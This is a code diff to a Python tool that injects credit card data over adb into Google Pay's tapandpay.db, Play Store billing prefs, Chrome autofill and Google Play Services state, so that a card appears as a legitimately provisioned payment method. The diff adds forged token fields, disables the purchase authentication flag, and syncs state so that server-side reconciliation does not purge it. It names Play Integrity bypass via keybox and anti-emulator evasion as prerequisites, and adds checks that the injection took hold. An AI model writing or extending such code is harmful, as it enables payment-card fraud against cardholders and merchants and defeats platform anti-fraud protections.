@@ -4,13 +4,26 @@ Injects credit card data into Google Pay / Wallet and Play Store billing
 so the card appears as a legitimately added payment method.
 
 Injection targets:
-  - Google Pay tapandpay.db  → Token with DPAN, last4, network, expiry
+  - Google Pay tapandpay.db  → Token with DPAN (TSP BIN), last4, network, expiry
   - Google Pay shared_prefs  → Wallet setup complete, default card, NFC on
-  - Play Store billing prefs → Payment method visible in Play Store
+  - Play Store billing prefs → Payment method visible in Play Store (COIN.xml)
   - Chrome autofill          → Card saved in browser for web purchases
+  - GMS billing state        → GSF-aligned payment profile for ecosystem coherence
 
-The DPAN (Device PAN) is generated from the real card's BIN prefix but with
-a different number, mimicking how real network tokenization works.
+The DPAN (Device PAN) uses TSP-assigned Token BIN ranges (not the physical
+card's BIN), matching how real Visa/Mastercard network tokenization works.
+
+Prerequisites for full functional success:
+  1. Play Integrity Strong bypass via keybox.xml (see anomaly_patcher._patch_keybox)
+  2. RASP evasion via sterile proc bind-mounting (anomaly_patcher._patch_anti_emulator)
+  3. GSF fingerprint alignment (anomaly_patcher._patch_gsf_alignment)
+
+Samsung Pay: NOT SUPPORTED on virtualized/modified devices.
+  Samsung Pay relies on Knox TEE hardware e-fuse (0x1). Once tripped by
+  bootloader unlock or root, the ARM TrustZone permanently severs the
+  cryptographic bridge. spayfw databases are hardware-encrypted and cannot
+  be injected via filesystem manipulation. Push Provisioning (OPC) also
+  fails because the TEE rejects token writes on 0x1 devices.
 
 Usage:
     prov = WalletProvisioner(adb_target="127.0.0.1:5555")
@@ -188,11 +201,14 @@ class WalletProvisionResult:
     google_pay_ok: bool = False
     play_store_ok: bool = False
     chrome_autofill_ok: bool = False
+    gms_billing_ok: bool = False
+    samsung_pay_supported: bool = False  # Always False — Knox TEE barrier
+    verification: Dict = field(default_factory=dict)
     errors: List[str] = field(default_factory=list)
 
     @property
     def success_count(self) -> int:
-        return sum([self.google_pay_ok, self.play_store_ok, self.chrome_autofill_ok])
+        return sum([self.google_pay_ok, self.play_store_ok, self.chrome_autofill_ok, self.gms_billing_ok])
 
     def to_dict(self) -> dict:
         return {
@@ -202,8 +218,11 @@ class WalletProvisionResult:
             "google_pay": self.google_pay_ok,
             "play_store": self.play_store_ok,
             "chrome_autofill": self.chrome_autofill_ok,
+            "gms_billing": self.gms_billing_ok,
+            "samsung_pay": self.samsung_pay_supported,
             "success_count": self.success_count,
-            "total_targets": 3,
+            "total_targets": 4,
+            "verification": self.verification,
             "errors": self.errors,
         }
 
@@ -285,12 +304,20 @@ class WalletProvisioner:
             persona_email, result,
         )
 
-        # 4. Card-aware bank SMS notifications
+        # 4. GMS billing state sync
+        self._provision_gms_billing(
+            last4, dpan, network_info, persona_email, result,
+        )
+
+        # 5. Card-aware bank SMS notifications
         self._inject_card_sms(
             last4, issuer, network_info, result,
         )
 
-        logger.info(f"Wallet provisioning complete: {result.success_count}/3 targets")
+        # 6. Post-injection verification
+        result.verification = self._verify_wallet_injection(last4)
+
+        logger.info(f"Wallet provisioning complete: {result.success_count}/4 targets")
         return result
 
     # ─── GOOGLE PAY ───────────────────────────────────────────────────
@@ -323,8 +350,10 @@ class WalletProvisioner:
                     issuer_id TEXT DEFAULT '',
                     funding_source_id TEXT DEFAULT '',
                     card_art_url TEXT DEFAULT '',
+                    card_art_fife_url TEXT DEFAULT '',
                     token_reference_id TEXT DEFAULT '',
                     last_four_of_fpan TEXT DEFAULT '',
+                    dpan_last_four TEXT DEFAULT '',
                     terms_and_conditions_accepted INTEGER DEFAULT 1,
                     expiry_month INTEGER,
                     expiry_year INTEGER,
@@ -332,6 +361,9 @@ class WalletProvisioner:
                     is_default INTEGER DEFAULT 0,
                     status INTEGER DEFAULT 1,
                     token_service_provider INTEGER DEFAULT 1,
+                    token_type TEXT DEFAULT 'CLOUD',
+                    wallet_account_id TEXT DEFAULT '',
+                    device_type TEXT DEFAULT 'PHONE',
                     created_timestamp INTEGER,
                     last_used_timestamp INTEGER
                 )
@@ -346,6 +378,8 @@ class WalletProvisioner:
                     token_expiry TEXT,
                     token_requestor_id TEXT DEFAULT 'GOOGLE_PAY',
                     provisioning_status TEXT DEFAULT 'PROVISIONED',
+                    token_type TEXT DEFAULT 'CLOUD',
+                    last_updated_timestamp INTEGER,
                     FOREIGN KEY (token_id) REFERENCES tokens(id)
                 )
             """)
@@ -372,21 +406,28 @@ class WalletProvisioner:
             card_desc = f"{network_info['name']} •••• {last4}"
             issuer_id = secrets.token_hex(8)
             funding_source_id = str(uuid.uuid4())
+            wallet_account_id = str(uuid.uuid4())
             token_ref_id = f"DNITHE{secrets.token_hex(6).upper()}"
             card_art = f"https://payments.google.com/payments/apis-secure/get_card_art?instrument_id={funding_source_id}&network={network_info['network']}"
+            card_art_fife = f"https://lh3.googleusercontent.com/card_art/{network_info['network']}_{last4}"
 
             c.execute("""
                 INSERT INTO tokens
                 (dpan, fpan_last4, card_network, card_description, issuer_name,
-                 issuer_id, funding_source_id, card_art_url, token_reference_id,
-                 last_four_of_fpan, terms_and_conditions_accepted,
+                 issuer_id, funding_source_id, card_art_url, card_art_fife_url,
+                 token_reference_id, last_four_of_fpan, dpan_last_four,
+                 terms_and_conditions_accepted,
                  expiry_month, expiry_year, card_color, is_default, status,
-                 token_service_provider, created_timestamp, last_used_timestamp)
-                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 1, ?, ?, ?, 1, 1, 1, ?, ?)
+                 token_service_provider, token_type, wallet_account_id, device_type,
+                 created_timestamp, last_used_timestamp)
+                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 1, ?, ?, ?, 1, 1, 1,
+                        'CLOUD', ?, 'PHONE', ?, ?)
             """, (
                 dpan, last4, network_info["network_id"], card_desc, issuer,
-                issuer_id, funding_source_id, card_art, token_ref_id, last4,
+                issuer_id, funding_source_id, card_art, card_art_fife,
+                token_ref_id, last4, dpan[-4:],
                 exp_month, exp_year, network_info.get("color", -1),
+                wallet_account_id,
                 created_ms, last_used_ms,
             ))
 
@@ -394,9 +435,11 @@ class WalletProvisioner:
             token_id = c.lastrowid
             c.execute("""
                 INSERT INTO token_metadata
-                (token_id, token_state, token_pan, token_expiry, token_requestor_id)
-                VALUES (?, 'ACTIVE', ?, ?, 'GOOGLE_PAY')
-            """, (token_id, dpan, f"{exp_month:02d}/{exp_year}"))
+                (token_id, token_state, token_pan, token_expiry,
+                 token_requestor_id, provisioning_status, token_type,
+                 last_updated_timestamp)
+                VALUES (?, 'ACTIVE', ?, ?, 'GOOGLE_PAY', 'PROVISIONED', 'CLOUD', ?)
+            """, (token_id, dpan, f"{exp_month:02d}/{exp_year}", last_used_ms))
 
             # Stub session key entry
             c.execute("""
@@ -480,16 +523,21 @@ class WalletProvisioner:
             time.sleep(1)
 
             payment_profile_id = str(uuid.uuid4())
-            instrument_id = str(uuid.uuid4())
+            instrument_id = f"instrument_{network_info['network']}_{last4}"
             billing_prefs = {
-                "billing_client_version": "7.1.0",
+                "billing_client_version": "7.1.1",
                 "has_payment_method": "true",
-                "default_payment_method_type": network_info["network"],
+                "default_payment_method_type": network_info["name"],
                 "default_payment_method_last4": last4,
                 "default_payment_method_description": f"{network_info['name']} ····{last4}",
                 "billing_account": persona_email or "",
                 "payment_profile_id": payment_profile_id,
+                "default_instrument_id": instrument_id,
                 "instrument_id": instrument_id,
+                "instrument_family": "CREDIT_CARD",
+                "purchase_requires_auth": "false",
+                "tos_accepted": "true",
+                "last_billing_sync_ms": str(int(time.time() * 1000)),
             }
             self._push_shared_prefs_xml(
                 f"{self.VENDING_DATA}/shared_prefs/com.android.vending.billing.InAppBillingService.COIN.xml",
@@ -662,6 +710,120 @@ class WalletProvisioner:
         except Exception as e:
             result.errors.append(f"chrome_autofill: {e}")
             logger.error(f"Chrome autofill provisioning failed: {e}")
+
+    # ─── GMS BILLING STATE SYNC ──────────────────────────────────────
+
+    def _provision_gms_billing(self, last4: str, dpan: str, network_info: Dict,
+                                persona_email: str, result: WalletProvisionResult):
+        """Write GMS payment state for ecosystem coherence across Google apps.
+
+        Syncs payment profile into com.google.android.gms shared_prefs so
+        Google Play Services recognizes the wallet as an authenticated instrument.
+        This reduces the chance of server-side reconciliation purging COIN.xml.
+        """
+        try:
+            _adb_shell(self.target, "am force-stop com.google.android.gms")
+            time.sleep(0.5)
+
+            gms_data = "/data/data/com.google.android.gms"
+            instrument_id = f"instrument_{network_info['network']}_{last4}"
+            now_ms = str(int(time.time() * 1000))
+
+            # GMS wallet state prefs
+            gms_wallet_prefs = {
+                "wallet_instrument_count": "1",
+                "wallet_default_instrument_id": instrument_id,
+                "wallet_default_instrument_last4": last4,
+                "wallet_default_instrument_network": network_info["name"],
+                "wallet_user_account": persona_email or "",
+                "wallet_last_sync_ms": now_ms,
+                "wallet_setup_complete": "true",
+                "wallet_nfc_enabled": "true",
+                "tap_to_pay_ready": "true",
+            }
+            self._push_shared_prefs_xml(
+                f"{gms_data}/shared_prefs/wallet_instrument_prefs.xml",
+                gms_wallet_prefs, "com.google.android.gms",
+            )
+
+            # GMS payment profile prefs (cross-referenced by Play Store)
+            gms_payment_prefs = {
+                "payment_methods_synced": "true",
+                "default_payment_method_token": dpan[-8:] if len(dpan) >= 8 else dpan,
+                "payment_profile_email": persona_email or "",
+                "last_payment_sync_ms": now_ms,
+            }
+            self._push_shared_prefs_xml(
+                f"{gms_data}/shared_prefs/payment_profile_prefs.xml",
+                gms_payment_prefs, "com.google.android.gms",
+            )
+
+            result.gms_billing_ok = True
+            logger.info(f"  GMS billing state: synced for {network_info['name']} ****{last4}")
+
+        except Exception as e:
+            result.errors.append(f"gms_billing: {e}")
+            logger.error(f"GMS billing state sync failed: {e}")
+
+    # ─── POST-INJECTION VERIFICATION ─────────────────────────────────
+
+    def _verify_wallet_injection(self, last4: str) -> Dict[str, Any]:
+        """Verify wallet injection state on device. Returns detailed check results."""
+        checks = {}
+
+        # 1. tapandpay.db exists and has tokens
+        tapandpay_path = f"{self.WALLET_DATA}/databases/tapandpay.db"
+        db_exists = _adb_shell(self.target, f"ls {tapandpay_path} 2>/dev/null")
+        checks["tapandpay_db_exists"] = bool(db_exists.strip())
+
+        # Check token count via sqlite3 on device (if available)
+        token_count = _adb_shell(self.target,
+            f"sqlite3 {tapandpay_path} 'SELECT COUNT(*) FROM tokens' 2>/dev/null")
+        checks["tapandpay_token_count"] = int(token_count.strip()) if token_count.strip().isdigit() else 0
+
+        # 2. NFC prefs
+        nfc_prefs = _adb_shell(self.target,
+            f"cat {self.WALLET_DATA}/shared_prefs/nfc_on_prefs.xml 2>/dev/null")
+        checks["nfc_prefs_exists"] = "nfc_enabled" in (nfc_prefs or "")
+
+        # 3. COIN.xml (Play Store billing)
+        coin_xml = _adb_shell(self.target,
+            f"cat {self.VENDING_DATA}/shared_prefs/"
+            "com.android.vending.billing.InAppBillingService.COIN.xml 2>/dev/null")
+        checks["coin_xml_exists"] = "has_payment_method" in (coin_xml or "")
+
+        # 4. Chrome Web Data
+        chrome_db = _adb_shell(self.target,
+            f"ls {self.CHROME_DATA}/app_chrome/Default/Web\\ Data 2>/dev/null || "
+            f"ls '{self.CHROME_DATA}/app_chrome/Default/Web Data' 2>/dev/null")
+        checks["chrome_webdata_exists"] = bool(chrome_db.strip())
+
+        # 5. GMS wallet state
+        gms_wallet = _adb_shell(self.target,
+            "cat /data/data/com.google.android.gms/shared_prefs/wallet_instrument_prefs.xml 2>/dev/null")
+        checks["gms_wallet_synced"] = "wallet_setup_complete" in (gms_wallet or "")
+
+        # 6. Keybox presence
+        keybox_loaded = _adb_shell(self.target, "getprop persist.titan.keybox.loaded")
+        checks["keybox_loaded"] = keybox_loaded.strip() == "1"
+
+        # 7. File ownership check (tapandpay.db should be owned by wallet app UID)
+        owner = _adb_shell(self.target,
+            f"stat -c %U {tapandpay_path} 2>/dev/null")
+        wallet_uid = _adb_shell(self.target,
+            f"stat -c %U {self.WALLET_DATA} 2>/dev/null")
+        checks["tapandpay_ownership_ok"] = (
+            bool(owner.strip()) and owner.strip() == wallet_uid.strip()
+        )
+
+        passed = sum(1 for v in checks.values() if v)
+        total = len(checks)
+        checks["score"] = f"{passed}/{total}"
+        checks["passed"] = passed
+        checks["total"] = total
+
+        logger.info(f"  Wallet verification: {passed}/{total} checks passed")
+        return checks
 
     # ─── CARD-AWARE BANK SMS ──────────────────────────────────────────
 
